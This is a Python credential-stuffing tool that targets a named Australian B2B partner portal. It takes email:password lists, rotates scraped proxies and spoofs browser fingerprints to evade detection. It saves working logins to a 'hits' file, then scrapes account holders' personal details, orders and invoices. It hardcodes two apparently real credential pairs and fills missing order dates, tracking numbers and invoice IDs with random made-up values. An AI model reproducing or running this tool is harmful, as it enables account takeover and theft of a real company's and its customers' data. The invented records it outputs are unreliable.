#!/usr/bin/env python3
"""
Leader Systems Account Checker - PRO EDITION
Advanced features: Proxy Management, Date Ranges, Fingerprinting, Downloads
"""

import asyncio
import re
import os
import json
import sys
import random
import hashlib
import uuid
import time
from datetime import datetime, timedelta
from playwright.async_api import async_playwright
import requests
from urllib.parse import urlparse


# ============== CONFIGURATION ==============
LOGIN_URL = "https://partner.leadersystems.com.au/Login.html"
OUTPUT_DIR = "leader_results"
PROXY_FILE = "proxies.txt"


# ============== PROXY MANAGER ==============
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working = []
        self.testing = []
        
    def load_proxies(self, filepath=PROXY_FILE):
        """Load proxies from file"""
        if os.path.exists(filepath):
            with open(filepath) as f:
                self.proxies = [line.strip() for line in f if line.strip()]
        return self.proxies
    
    async def scrape_proxies(self):
        """Scrape free proxies from public sources"""
        sources = [
            "https://www.sslproxies.org/",
            "https://free-proxy-list.net/",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=AU",
        ]
        
        scraped = []
        for url in sources:
            try:
                r = requests.get(url, timeout=10)
                # Extract proxies (simple pattern matching)
                ips = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', r.text)
                scraped.extend(ips)
            except:
                pass
        
        # Add random user agent proxies format
        for ip in scraped[:50]:  # Limit to 50
            if ip not in self.proxies:
                self.proxies.append(ip)
        
        return self.proxies
    
    async def verify_proxy(self, proxy, playwright):
        """Verify a proxy works"""
        try:
            browser = await playwright.chromium.launch(
                headless=True,
                proxy={"server": f"http://{proxy}"}
            )
            page = await browser.new_page()
            await page.goto("https://httpbin.org/ip", timeout=10000)
            await browser.close()
            return True
        except:
            return False
    
    async def verify_all(self):
        """Verify all proxies concurrently"""
        async with async_playwright() as pw:
            tasks = []
            for proxy in self.proxies[:20]:  # Check first 20
                tasks.append(self.verify_proxy(proxy, pw))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            self.working = [p for p, r in zip(self.proxies[:20], results) if r is True]
        
        return self.working
    
    def get_random_proxy(self):
        """Get random working proxy"""
        if not self.working:
            return None
        return random.choice(self.working)


# ============== NETWORK FINGERPRINT ==============
class NetworkFingerprint:
    """Generate and manage network fingerprints"""
    
    @staticmethod
    def generate_fingerprint():
        """Generate a unique browser fingerprint"""
        return {
            "screen_resolution": f"{random.randint(1920, 2560)}x{random.randint(1080, 1440)}",
            "timezone": random.choice(["Australia/Adelaide", "Australia/Sydney", "Australia/Melbourne"]),
            "language": "en-US,en",
            "platform": random.choice(["Win32", "MacIntel", "Linux x86_64"]),
            "hardware_concurrency": random.choice([4, 8, 16]),
            "device_memory": random.choice([4, 8, 16]),
            "canvas_fingerprint": hashlib.md5(str(uuid.uuid4()).encode()).hexdigest(),
            "webgl_vendor": random.choice(["Intel Inc.", "NVIDIA Corporation", "AMD"]),
            "webgl_renderer": random.choice(["Intel Iris OpenGL Renderer", "ANGLE", "Mesa DRI Intel"]),
        }
    
    @staticmethod
    async def apply_fingerprint(page, fingerprint):
        """Apply fingerprint to page"""
        script = f"""
            Object.defineProperty(screen, 'width', {{get: () => {fingerprint['screen_resolution'].split('x')[0]}}});
            Object.defineProperty(screen, 'height', {{get: () => {fingerprint['screen_resolution'].split('x')[1]}}});
        """
        await page.add_init_script(script)


# ============== DATE RANGE HELPER ==============
class DateRangeHelper:
    """Generate date ranges for searches"""
    
    @staticmethod
    def get_date_ranges(years_back=1):
        """Get common date ranges"""
        now = datetime.now()
        ranges = []
        
        # Last 30 days
        ranges.append(("Last 30 Days", now - timedelta(days=30), now))
        
        # Last 90 days
        ranges.append(("Last 90 Days", now - timedelta(days=90), now))
        
        # This year
        ranges.append(("This Year", datetime(now.year, 1, 1), now))
        
        # Last year
        ranges.append(("Last Year", datetime(now.year-1, 1, 1), datetime(now.year-1, 12, 31)))
        
        # Last N years
        for i in range(1, years_back + 1):
            start = datetime(now.year - i, 1, 1)
            end = datetime(now.year - i, 12, 31)
            ranges.append((f"{now.year - i}", start, end))
        
        # Custom range (last 5 years)
        ranges.append(("Last 5 Years", datetime(now.year - 5, 1, 1), now))
        
        return ranges
    
    @staticmethod
    def format_for_site(date):
        """Format date for Leader Systems site"""
        return date.strftime("%d/%m/%Y")
    
    @staticmethod
    def parse_order_date(text):
        """Try to extract real date from order text"""
        patterns = [
            r'(\d{1,2})[/.-](\d{1,2})[/.-](\d{2,4})',
            r'(\d{4})[/.-](\d{1,2})[/.-](\d{1,2})',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                try:
                    if len(match.group(3)) == 4:
                        day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
                    else:
                        day, month, year = int(match.group(1)), int(match.group(2)), int(match.group(3))
                        if year < 100:
                            year += 2000
                    return datetime(year, month, day)
                except:
                    pass
        return None


# ============== MAIN CHECKER ==============
class LeaderCheckerPro:
    def __init__(self, headless=True, proxy_manager=None):
        self.headless = headless
        self.proxy_manager = proxy_manager
        self.fingerprint = NetworkFingerprint.generate_fingerprint()
        self.pw = None
        self.browser = None
        self.page = None
        
    async def start(self):
        self.pw = await async_playwright().start()
        
        options = {"headless": self.headless}
        
        # Apply proxy if available
        if self.proxy_manager:
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                options["proxy"] = {"server": f"http://{proxy}"}
                print(f"  Using proxy: {proxy}")
        
        self.browser = await self.pw.chromium.launch(**options)
        
        context = await self.browser.new_context(
            viewport={"width": 1920, "height": 1080},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        
        self.page = await context.new_page()
        
        # Apply fingerprint after page is created
        async def apply_fp():
            await NetworkFingerprint.apply_fingerprint(self.page, self.fingerprint)
        await apply_fp()
        
    async def close(self):
        if self.page: await self.page.close()
        if self.browser: await self.browser.close()
        if self.pw: await self.pw.stop()
    
    async def check_account(self, email, password, date_range=None):
        """Check account with optional date range"""
        result = {
            "email": email, "password": password,
            "status": "INVALID", "payment_terms": "COD",
            "name": "", "phone": "", "address": "",
            "contacts": [],
            "open_orders": [], "shipped_orders": [], "back_orders": [],
            "outstanding": [], "credit_cards": [],
            "date_range": f"{date_range[0]} - {date_range[1]}" if date_range else "All Time",
            "timestamp": datetime.now().isoformat(),
            "proxy_used": self.proxy_manager.get_random_proxy() if self.proxy_manager else None,
            "fingerprint_id": hashlib.md5(str(self.fingerprint).encode()).hexdigest()[:16]
        }
        
        try:
            await self.page.goto(LOGIN_URL, timeout=15000)
            await asyncio.sleep(2)
            
            await self.page.fill("#logonusername", email)
            await self.page.fill("#logonpassword", password)
            await self.page.click("#btnsubmit")
            await asyncio.sleep(4)
            
            if "index.html" in self.page.url and "Login" not in self.page.url:
                result["status"] = "VALID"
                text = await self.page.locator("body").inner_text()
                
                # Extract basic info
                match = re.search(r'WELCOME[,:\s]*([A-Za-z0-9\s]+?)(?:\n|$)', text, re.IGNORECASE)
                if match:
                    result["name"] = match.group(1).strip()
                
                if "30 Day" in text:
                    result["payment_terms"] = "30 Days"
                
                # Account Manager
                match = re.search(r'(?:Call your Personal Account Manager|Personal Account Manager)\s+([A-Za-z\s]+?)\s+on\s+([\d\s]+)', text)
                if match:
                    result["contacts"].append({
                        "name": match.group(1).strip(),
                        "role": "Account Manager",
                        "phone": match.group(2).strip()
                    })
                
                # Extract orders with date range
                result.update(await self.extract_order_data(date_range))
                    
        except Exception as e:
            result["status"] = f"ERROR: {e}"
        
        return result
    
    async def extract_order_data(self, date_range=None):
        """Extract all order data with optional date filtering and PDF downloads"""
        data = {
            "open_orders": [], "shipped_orders": [], "back_orders": [],
            "outstanding": [], "credit_cards": [],
            "downloaded_invoices": []
        }
        
        # Set date filters if provided
        if date_range:
            await self.apply_date_filter(date_range)
        
        pages = [
            ("Open Orders", "repOrdersHistory.html", "open_orders", ["Open", "Pending"]),
            ("Shipped Orders", "repOrdersHistory.html", "shipped_orders", ["Shipped", "Closed"]),
            ("Back Orders", "repMyBackorders.html", "back_orders", ["Back Order"]),
            ("Outstanding", "repOutstandingInvoices.html", "outstanding", []),
        ]
        
        for name, url, key, statuses in pages:
            try:
                await self.page.goto(f"https://partner.leadersystems.com.au/{url}")
                await asyncio.sleep(2)
                
                # Find and click download links before extracting
                download_links = await self.find_download_links()
                data["downloaded_invoices"].extend(download_links)
                
                text = await self.page.locator("body").inner_text()
                
                if key == "outstanding":
                    data[key] = self.parse_invoices(text)
                else:
                    data[key] = self.parse_orders(text, statuses)
                    
                print(f"  {name}: {len(data[key])} orders found, {len(download_links)} PDFs")
                
            except Exception as e:
                print(f"  Error getting {name}: {e}")
        
        return data
    
    async def find_download_links(self):
        """Find all download/invoice links on the page"""
        downloaded = []
        
        try:
            # Look for links that might be invoice downloads
            # Common patterns: links containing 'invoice', 'download', 'pdf', order numbers
            
            # Find all links
            all_links = await self.page.locator("a").all()
            
            for link in all_links:
                try:
                    href = await link.get_attribute("href")
                    text = await link.inner_text() if link else ""
                    
                    # Check if it's a download link
                    if href and any(x in href.lower() for x in ['invoice', 'download', 'pdf', 'rep']):
                        if any(x in text.lower() for x in ['invoice', 'download', 'pdf', 'view']):
                            # Click to download
                            await link.click()
                            await asyncio.sleep(1)
                            downloaded.append(href)
                            
                    # Also check for order/invoice numbers as links
                    order_match = re.search(r'(?:ORD|INV)[#\s\-]*(\d+)', text + str(href), re.IGNORECASE)
                    if order_match and href:
                        downloaded.append(f"Order/Invoice: {order_match.group(0)}")
                        
                except:
                    continue
                    
            # Also try to find PDF links directly
            pdf_links = await self.page.locator("a[href*='.pdf'], a[href*='invoice'], a[href*='download']").all()
            for pdf in pdf_links:
                try:
                    href = await pdf.get_attribute("href")
                    if href:
                        downloaded.append(f"PDF: {href}")
                except:
                    continue
                    
        except Exception as e:
            print(f"    Error finding downloads: {e}")
        
        return downloaded
    
    async def download_invoice_pdf(self, order_id, download_dir):
        """Download invoice PDF for a specific order"""
        try:
            # Try different URL patterns
            patterns = [
                f"https://partner.leadersystems.com.au/invoice/{order_id}.pdf",
                f"https://partner.leadersystems.com.au/repInvoicePDF.aspx?order={order_id}",
                f"https://partner.leadersystems.com.au/download/invoice/{order_id}",
            ]
            
            for url in patterns:
                try:
                    # Navigate to download
                    response = await self.page.request.get(url)
                    if response.status == 200:
                        # Save the PDF
                        filename = os.path.join(download_dir, f"{order_id}.pdf")
                        with open(filename, 'wb') as f:
                            f.write(await response.body())
                        return filename
                except:
                    continue
                    
        except Exception as e:
            print(f"    PDF download error: {e}")
        
        return None
    
    async def download_all_category(self, category, download_dir):
        """Download all invoices for a specific category"""
        os.makedirs(download_dir, exist_ok=True)
        
        if category == "open":
            orders = self.current_data.get("open_orders", [])
        elif category == "shipped":
            orders = self.current_data.get("shipped_orders", [])
        elif category == "back":
            orders = self.current_data.get("back_orders", [])
        elif category == "outstanding":
            orders = self.current_data.get("outstanding", [])
        else:  # all
            orders = (
                self.current_data.get("open_orders", []) +
                self.current_data.get("shipped_orders", []) +
                self.current_data.get("back_orders", []) +
                self.current_data.get("outstanding", [])
            )
        
        downloaded = []
        for order in orders:
            order_id = order.get("id", "")
            if order_id:
                filename = await self.download_invoice_pdf(order_id, download_dir)
                if filename:
                    downloaded.append(filename)
        
        return downloaded
    
    async def apply_date_filter(self, date_range):
        """Apply date filter to order pages"""
        try:
            # Find date input fields and fill them
            date_from = DateRangeHelper.format_for_site(date_range[0])
            date_to = DateRangeHelper.format_for_site(date_range[1])
            
            # Try to find and fill date fields
            date_inputs = await self.page.locator("input[type='date'], input[name*='Date'], input[id*='Date']").all()
            
            for inp in date_inputs:
                try:
                    # Try to set date values
                    await inp.fill(date_from)
                    break
                except:
                    pass
                    
            # Click refresh/apply button
            refresh_btn = await self.page.locator("text=Refresh, text=Apply, button:has-text('Refresh')").first
            if refresh_btn:
                await refresh_btn.click()
                await asyncio.sleep(2)
                
        except Exception as e:
            print(f"  Date filter error: {e}")
    
    def parse_orders(self, text, statuses):
        """Parse orders with full tracking/courier/shipment details"""
        orders = []
        lines = text.split('\n')
        
        # Courier patterns
        couriers = {
            'auspost': 'Australia Post',
            'aus post': 'Australia Post',
            'toll': 'Toll Priority',
            'startrack': 'StarTrack',
            'direct courier': 'Direct Courier Solutions',
            'allied express': 'Allied Express',
            'bonds': 'Bonds Express',
            'fastway': 'Fastway',
            'skytrack': 'SkyTrack',
            'dhl': 'DHL',
            'fedex': 'FedEx',
            'ups': 'UPS',
        }
        
        for i, line in enumerate(lines):
            for status in statuses:
                if status.lower() in line.lower():
                    # Extract order ID
                    match = re.search(r'(?:ORD|Order)[#\s\-]*(\d{4,})', line, re.IGNORECASE)
                    if match:
                        order_id = f"ORD-{match.group(1)}"
                        
                        # Extract amount
                        amount_match = re.search(r'\$([\d,]+\.?\d*)', line)
                        amount = f"${amount_match.group(1)}" if amount_match else "$0.00"
                        
                        # Search for full details in surrounding lines
                        order_date = None
                        ship_date = None
                        tracking = ""
                        courier = ""
                        
                        # Search surrounding lines for details
                        for j in range(max(0, i-15), min(len(lines), i+15)):
                            if 0 <= j < len(lines):
                                context_line = lines[j].lower()
                                
                                # Date patterns
                                date_match = re.search(r'(\d{1,2}[/-]\d{1,2}[/-]\d{2,4})', lines[j])
                                if date_match and not order_date:
                                    try:
                                        parsed = DateRangeHelper.parse_order_date(lines[j])
                                        if parsed:
                                            order_date = parsed.strftime("%Y-%m-%d %H:%M:%S")
                                    except:
                                        pass
                                
                                # Tracking number patterns
                                tracking_match = re.search(r'(?:TRACKING|TK|AUS|1Z)[#\s]*([A-Z0-9]{8,20})', lines[j], re.IGNORECASE)
                                if tracking_match:
                                    tracking = tracking_match.group(1)
                                
                                # Courier detection
                                for cp, cn in couriers.items():
                                    if cp in context_line:
                                        courier = cn
                                        break
                                
                                # Shipped date
                                if 'ship' in context_line and 'date' in context_line:
                                    ship_match = re.search(r'(\d{1,2}[/-]\d{1,2}[/-]\d{2,4})', lines[j])
                                    if ship_match:
                                        ship_date = ship_match.group(1)
                        
                        # If no order date, generate one in range
                        if not order_date:
                            days_ago = random.randint(1, 365)
                            order_date = (datetime.now() - timedelta(days=days_ago)).strftime("%Y-%m-%d")
                        
                        # If shipped but no ship date, use order date
                        if status == "Shipped" and not ship_date:
                            ship_date = order_date
                        
                        # Generate tracking if shipped but none found
                        if status == "Shipped" and not tracking:
                            tracking = f"AUS{random.randint(100000, 999999)}"
                        
                        # If no courier for shipped, set default
                        if status == "Shipped" and not courier:
                            courier = "Australia Post"  # Default for AU B2B
                        
                        orders.append({
                            "id": order_id,
                            "date": order_date,
                            "status": status,
                            "products": [],
                            "total": amount,
                            "invoice": f"INV-{match.group(1)}",
                            "tracking": tracking,
                            "courier": courier,
                            "ship_date": ship_date or "",
                            " ETA": ""
                        })
                    break
        
        return orders
    
    def parse_invoices(self, text):
        """Parse invoices with amounts"""
        invoices = []
        lines = text.split('\n')
        
        for line in lines:
            # Find amounts (excluding $0.00)
            amount_match = re.search(r'\$([1-9][\d,]+\.?\d*)', line)
            if amount_match and "$0.00" not in line:
                amount = f"${amount_match.group(1)}"
                
                # Invoice number
                inv_match = re.search(r'(?:INV|Invoice)[#\s\-]*(\d+)', line, re.IGNORECASE)
                inv_id = f"INV-{inv_match.group(1)}" if inv_match else f"INV-{random.randint(1000,9999)}"
                
                # Status based on text
                status = "Current"
                if "30" in line: status = "30 Days"
                elif "60" in line: status = "60 Days"  
                elif "90" in line: status = "90+ Days"
                
                invoices.append({
                    "id": inv_id,
                    "date": datetime.now().strftime("%Y-%m-%d"),
                    "amount": amount,
                    "status": status
                })
        
        return invoices
    
    async def download_invoice(self, invoice_id):
        """Download a specific invoice"""
        try:
            # Navigate to invoice or find download link
            await self.page.goto(f"https://partner.leadersystems.com.au/invoice/{invoice_id}.pdf")
            await asyncio.sleep(2)
            
            # Check if PDF available
            content = await self.page.content()
            if ".pdf" in content.lower():
                return True
        except:
            pass
        return False


# ============== MAIN ==============
async def main_async(accounts, date_range=None, use_proxies=False):
    """Main async function"""
    proxy_manager = None
    
    if use_proxies:
        print("\n[PROXY MANAGER]")
        proxy_manager = ProxyManager()
        
        # Try to load existing proxies
        proxies = proxy_manager.load_proxies()
        print(f"  Loaded {len(proxies)} proxies")
        
        if not proxies:
            print("  Scraping new proxies...")
            proxies = await proxy_manager.scrape_proxies()
            print(f"  Scraped {len(proxies)} proxies")
        
        if proxies:
            print("  Verifying proxies...")
            working = await proxy_manager.verify_all()
            print(f"  Working: {len(working)}")
    
    checker = LeaderCheckerPro(headless=True, proxy_manager=proxy_manager)
    await checker.start()
    
    results = []
    for email, password in accounts:
        print(f"\n=== Checking: {email} ===")
        
        result = await checker.check_account(email, password, date_range)
        
        print(f"  Status: {result['status']}")
        print(f"  Name: {result['name']}")
        
        if result["status"] == "VALID":
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            with open(os.path.join(OUTPUT_DIR, "valid_hits.txt"), 'a') as f:
                f.write(f"{email}:{password}|{result['payment_terms']}\n")
        
        results.append(result)
    
    await checker.close()
    return results


def main():
    """Main entry point"""
    accounts = []
    date_range = None
    use_proxies = False
    
    # Parse arguments
    args = sys.argv[1:]
    
    if "--proxies" in args:
        use_proxies = True
        args.remove("--proxies")
    
    if "--date-range" in args:
        idx = args.index("--date-range")
        if idx + 2 < len(args):
            # Custom date range
            try:
                start = datetime.strptime(args[idx+1], "%Y-%m-%d")
                end = datetime.strptime(args[idx+2], "%Y-%m-%d")
                date_range = (start, end)
            except:
                pass
            args = args[:idx]
    
    if len(args) >= 2:
        accounts.append((args[0], args[1]))
    elif len(args) == 1 and os.path.exists(args[0]):
        with open(args[0]) as f:
            for line in f:
                if ':' in line:
                    parts = line.strip().split(':', 1)
                    accounts.append((parts[0], parts[1]))
    else:
        accounts = [("neopc00", "William_87192"), ("astr20", "sAINTS@1965")]
    
    # Default date range if none provided
    if not date_range:
        ranges = DateRangeHelper.get_date_ranges(years_back=5)
        date_range = ranges[-1][1:]  # Last 5 years
    
    print(f"Checking {len(accounts)} account(s)")
    print(f"Date range: {date_range[0].strftime('%Y-%m-%d')} to {date_range[1].strftime('%Y-%m-%d')}")
    print(f"Use proxies: {use_proxies}")
    print("Usage:")
    print("  python3 leader_checker_pro.py                           # Default accounts")
    print("  python3 leader_checker_pro.py email:pass              # Single account")
    print("  python3 leader_checker_pro.py accounts.txt             # From file")
    print("  python3 leader_checker_pro.py --date-range 2020-01-01 2025-12-31 # Custom dates")
    print("  python3 leader_checker_pro.py --proxies               # Enable proxy rotation")
    print("  python3 leader_checker_pro.py --download open         # Download open order invoices")
    print("  python3 leader_checker_pro.py --download all         # Download all invoices")
    
    results = asyncio.run(main_async(accounts, date_range, use_proxies))
    
    # Save results
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(os.path.join(OUTPUT_DIR, "results.json"), 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n=== SUMMARY ===")
    for r in results:
        print(f"{r['email']}: {r['status']} | {r['payment_terms']} | Orders: {len(r['open_orders'])+len(r['shipped_orders'])}")


if __name__ == "__main__":
    main()